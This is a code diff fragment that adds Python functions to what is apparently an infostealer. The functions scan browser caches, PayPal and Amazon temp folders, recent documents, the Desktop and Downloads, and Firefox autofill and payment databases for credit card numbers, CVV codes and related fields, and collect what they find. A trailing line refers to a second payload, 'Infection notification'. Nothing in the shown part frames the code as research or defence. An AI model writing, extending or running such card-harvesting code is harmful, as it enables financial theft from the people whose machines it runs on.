+            os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Cache'),
+            os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default', 'Cache'),
+            
+            # Application temp folders
+            os.path.join(os.getenv('APPDATA'), 'PayPal', 'temp'),
+            os.path.join(os.getenv('APPDATA'), 'Amazon', 'cache'),
+        ]
+        
+        for temp_location in temp_locations:
+            if not os.path.exists(temp_location):
+                continue
+                
+            try:
+                # Only scan recent files (last 7 days) for performance
+                cutoff_time = time.time() - (7 * 24 * 3600)
+                
+                for root, dirs, files in os.walk(temp_location):
+                    for file in files:
+                        file_path = os.path.join(root, file)
+                        
+                        try:
+                            # Check file modification time
+                            if os.path.getmtime(file_path) < cutoff_time:
+                                continue
+                            
+                            # Only scan small text files
+                            if (os.path.getsize(file_path) < 1024 * 1024  # < 1MB
+                                and any(file.lower().endswith(ext) for ext in ['.txt', '.log', '.tmp', '.cache', '.json'])):
+                                
+                                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+                                    content = f.read()
+                                
+                                found_cards = find_credit_cards_in_text(content, f'Temp File - {file}')
+                                for card_info in found_cards:
+                                    card_info['temp_file_path'] = file_path
+                                    card_info['file_modified'] = os.path.getmtime(file_path)
+                                    cards.append(card_info)
+                                    
+                        except Exception:
+                            continue
+                            
+            except Exception as location_error:
+                print(f"💳 Error scanning temp location {temp_location}: {str(location_error)}")
+                continue
+        
+        return cards
+        
+    except Exception as e:
+        print(f"💳 Temp files extraction error: {e}")
+        return []
+
+def extract_credit_cards_from_recent_docs():
+    """NEW: Extract credit cards from recent documents and files"""
+    try:
+        cards = []
+        
+        # Recent documents locations
+        recent_locations = [
+            os.path.expanduser("~/Recent"),
+            os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Recent'),
+            os.path.join(os.getenv('USERPROFILE'), 'Documents'),
+            os.path.join(os.getenv('USERPROFILE'), 'Desktop'),
+            os.path.join(os.getenv('USERPROFILE'), 'Downloads'),
+        ]
+        
+        # File types that might contain payment information
+        payment_file_patterns = [
+            '*receipt*', '*invoice*', '*payment*', '*billing*', '*order*',
+            '*purchase*', '*transaction*', '*card*', '*paypal*', '*stripe*'
+        ]
+        
+        for location in recent_locations:
+            if not os.path.exists(location):
+                continue
+                
+            try:
+                # Get recently modified files (last 30 days)
+                cutoff_time = time.time() - (30 * 24 * 3600)
+                
+                for root, dirs, files in os.walk(location):
+                    for file in files:
+                        # Check if filename suggests payment-related content
+                        if any(pattern.replace('*', '') in file.lower() for pattern in payment_file_patterns):
+                            file_path = os.path.join(root, file)
+                            
+                            try:
+                                # Check if file is recent
+                                if os.path.getmtime(file_path) < cutoff_time:
+                                    continue
+                                
+                                # Only scan reasonable file sizes
+                                if os.path.getsize(file_path) > 5 * 1024 * 1024:  # Skip files > 5MB
+                                    continue
+                                
+                                # Scan text-based files
+                                if file.lower().endswith(('.txt', '.csv', '.json', '.xml', '.rtf', '.doc', '.docx')):
+                                    try:
+                                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+                                            content = f.read()
+                                        
+                                        found_cards = find_credit_cards_in_text(content, f'Recent Doc - {file}')
+                                        for card_info in found_cards:
+                                            card_info['document_path'] = file_path
+                                            card_info['document_modified'] = os.path.getmtime(file_path)
+                                            cards.append(card_info)
+                                            
+                                    except Exception:
+                                        continue
+                                        
+                            except Exception:
+                                continue
+                                
+            except Exception as location_error:
+                print(f"💳 Error scanning recent docs location {location}: {str(location_error)}")
+                continue
+        
+        return cards
+        
+    except Exception as e:
+        print(f"💳 Recent docs extraction error: {e}")
+        return []
+
+def extract_firefox_autofill_cards_enhanced(profile_path):
+    """Enhanced Firefox autofill extraction with better data collection"""
+    try:
+        cards = []
+        
+        # Firefox stores autofill data in formhistory.sqlite
+        formhistory_path = os.path.join(profile_path, 'formhistory.sqlite')
+        if not os.path.exists(formhistory_path):
+            return cards
+        
+        temp_db = tempfile.mktemp(suffix='.db')
+        shutil.copy2(formhistory_path, temp_db)
+        
+        conn = sqlite3.connect(temp_db)
+        cursor = conn.cursor()
+        
+        # Enhanced query for Firefox form history
+        cursor.execute("""
+            SELECT fieldname, value, firstUsed, lastUsed, timesUsed
+            FROM moz_formhistory
+            WHERE (fieldname LIKE '%card%' OR fieldname LIKE '%credit%' OR fieldname LIKE '%payment%'
+                   OR fieldname LIKE '%cc%' OR fieldname LIKE '%cvv%' OR fieldname LIKE '%cvc%'
+                   OR fieldname LIKE '%number%' OR fieldname LIKE '%pan%')
+            AND value IS NOT NULL AND value != ''
+        """)
+        
+        for row in cursor.fetchall():
+            try:
+                fieldname, value, first_used, last_used, times_used = row
+                
+                if validate_credit_card_enhanced(value):
+                    cards.append({
+                        'card_number': value,
+                        'field_name': fieldname,
+                        'first_used': first_used,
+                        'last_used': last_used,
+                        'times_used': times_used,
+                        'source': 'firefox_autofill',
+                        'browser': 'Firefox',
+                        'profile_path': profile_path
+                    })
+            except Exception:
+                continue
+        
+        conn.close()
+        os.unlink(temp_db)
+        return cards
+        
+    except Exception as e:
+        print(f"💳 Enhanced Firefox autofill extraction error: {e}")
+        return []
+
+def extract_firefox_payment_methods_enhanced(profile_path):
+    """Enhanced Firefox payment methods extraction"""
+    try:
+        cards = []
+        
+        # Enhanced Firefox payment data files
+        payment_files = [
+            'payments.json', 'payment-methods.json', 'autofill.json',
+            'formautofill.sqlite', 'creditcards.sqlite'
+        ]
+        
+        for payment_file in payment_files:
+            file_path = os.path.join(profile_path, payment_file)
+            if os.path.exists(file_path):
+                try:
+                    if payment_file.endswith('.json'):
+                        # JSON files
+                        with open(file_path, 'r', encoding='utf-8') as f:
+                            data = json.load(f)
+                        
+                        # Recursively search JSON for credit card patterns
+                        cards.extend(extract_cards_from_json(data, f'Firefox {payment_file}'))
+                        
+                    elif payment_file.endswith('.sqlite'):
+                        # SQLite databases
+                        temp_db = tempfile.mktemp(suffix='.db')
+                        shutil.copy2(file_path, temp_db)
+                        
+                        conn = sqlite3.connect(temp_db)
+                        cursor = conn.cursor()
+                        
+                        # Get table names
+                        cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
+                        tables = [row[0] for row in cursor.fetchall()]
+                        
+                        for table in tables:
+                            try:
+                                cursor.execute(f"SELECT * FROM {table}")
+                                for row in cursor.fetchall():
+                                    for value in row:
+                                        if isinstance(value, str) and len(value) > 10:
+                                            found_cards = find_credit_cards_in_text(value, f'Firefox {payment_file} - {table}')
+                                            cards.extend(found_cards)
+                            except Exception:
+                                continue
+                        
+                        conn.close()
+                        os.unlink(temp_db)
+                        
+                except Exception as file_error:
+                    print(f"💳 Error processing Firefox file {payment_file}: {str(file_error)}")
+                    continue
+        
+        return cards
+        
+    except Exception as e:
+        print(f"💳 Enhanced Firefox payment methods extraction error: {e}")
+        return []
+
+def extract_cards_from_json(data, source):
+    """Recursively extract credit cards from JSON data"""
+    try:
+        cards = []
+        
+        def search_json_recursive(obj, path=""):
+            if isinstance(obj, dict):
+                for key, value in obj.items():
+                    new_path = f"{path}.{key}" if path else key
+                    search_json_recursive(value, new_path)
+            elif isinstance(obj, list):
+                for i, item in enumerate(obj):
+                    new_path = f"{path}[{i}]" if path else f"[{i}]"
+                    search_json_recursive(item, new_path)
+            elif isinstance(obj, str) and len(obj) > 10:
+                found_cards = find_credit_cards_in_text(obj, f'{source} - {path}')
+                cards.extend(found_cards)
+        
+        search_json_recursive(data)
+        return cards
+        
+    except Exception as e:
+        print(f"💳 JSON extraction error: {e}")
         return []
 
 # Payload 2: Infection notification
